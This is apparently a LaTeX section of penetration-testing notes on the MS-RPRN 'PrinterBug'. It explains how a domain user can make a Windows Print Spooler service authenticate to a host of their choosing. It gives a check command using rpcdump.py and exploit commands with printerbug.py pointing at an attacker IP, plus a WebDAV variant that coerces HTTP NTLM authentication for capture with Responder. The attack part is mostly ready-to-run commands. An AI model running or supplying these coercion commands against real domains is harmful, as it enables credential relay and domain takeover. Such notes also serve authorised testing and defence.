\section{MS-RPRN PrinterBug}
\subsection{Introduction}
Microsoftâ€™s Print Spooler is a service handling the print jobs and other various tasks related to printing.

An attacker controling a domain user/computer can, with a specific RPC call, trigger the spooler service of a target running it and make it authenticate to a target of the attacker's choosing.

This flaw is a "won't fix" and enabled by default on all Windows environments.

The coerced authentications are made over SMB. But MS-RPRN abuse can be combined with \href{https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient}{WebClient abuse} to elicit incoming authentications made over HTTP.

\subsection{check}

\begin{verbatim}
rpcdump.py $TARGET | grep -A 6 "spoolsv"
\end{verbatim}

Powershell \href{https://github.com/vletoux/SpoolerScanner}{SpoolerScanner}

\subsection{Exploit}

\begin{verbatim}
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' <attacker_ip>
\end{verbatim}

To coerce HTTP NTLM authentication on WebDAV-enabled hosts, we use the same syntax; however, for the listener, we will set it as a valid WebDAV connection string, using the format \verb+ATTACKER_MACHINE_NAME@PORT/PATH+

\begin{verbatim}
python3 printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET'  SUPPORTPC@80/print
\end{verbatim}

\begin{itemize}
    \item 
        \verb+ATTACKER_MACHINE_NAME+ must be the NetBIOS or DNS name of the attacker machine because Responder will poison broadcast traffic in any case, we set it to an arbitrary string.
    \item 
        \verb+PORT+ specifies an arbitrary port the WebDAV service will use to connect to the attack machine.
    \item 
        \verb+PATH+ specifies an arbitrary path the WebDAV service will attempt to connect.
\end{itemize}

\href{https://github.com/leechristensen/SpoolSample}{SpoolSample}


